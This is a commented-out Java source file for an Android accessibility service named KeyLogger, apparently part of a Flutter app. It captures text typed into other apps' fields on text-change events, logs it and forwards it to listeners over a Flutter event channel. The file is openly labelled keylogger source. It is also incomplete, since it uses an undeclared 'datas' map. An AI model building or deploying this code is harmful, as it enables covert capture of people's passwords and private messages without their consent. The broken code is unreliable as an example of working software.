//package youtube.sidtube.keylogger;
//
//import android.accessibilityservice.AccessibilityService;
//import android.os.Build;
//import android.os.Handler;
//import android.util.Log;
//import android.view.accessibility.AccessibilityEvent;
//
//import androidx.annotation.RequiresApi;
//
//import java.util.ArrayList;
//import java.util.HashMap;
//import java.util.Map;
//
//import io.flutter.plugin.common.EventChannel;
//
//public class KeyLogger extends AccessibilityService {
//
//
//    private Map<Object, Runnable> listeners = new HashMap<>();
//    EventChannel.EventSink events;
//    //    HashMap logs=new HashMap<>();
//    ArrayList<log> logs = new ArrayList();
//    log l;
//
//    @Override
//    public void onServiceConnected() {
//        Log.d("Keylogger", "Starting service");
//    }
//
////    @RequiresApi(api = Build.VERSION_CODES.N)
//    @Override
//    public void onAccessibilityEvent(AccessibilityEvent event) {
//
//
//        switch (event.getEventType()) {
//            case AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED: {
//                String data = event.getText().toString();
//                datas.put("log", data);
//                datas.put("type", "text");
//                Log.d("Keylogger", String.valueOf(logs.size()));
//                l.data(datas);
//
//                for (int i = 0; i < logs.size(); i++) {
//                    logs.get(i).data(datas);
//                    Log.d("Keylogger", datas.toString());
//
//                }
//                break;
//            }
//            case AccessibilityEvent.TYPE_VIEW_FOCUSED: {
////                String data = event.getText().toString();
////                Log.d("Keylogger", data);
//
//                break;
//            }
//            case AccessibilityEvent.TYPE_VIEW_CLICKED: {
////                String data = event.getText().toString();
////                Log.d("Keylogger", data);
//
//                break;
//            }
//            default:
//                break;
//        }
//    }
//
//    @Override
//    public void onInterrupt() {
//
//    }
//
//    public void onData(log l) {
//        logs.add(l);
//        this.l=l;
//        Log.d("log","ondaa");
//
//    }
//
//  public  interface log {
//        void data(Map<String, String> datas);
//    }
//}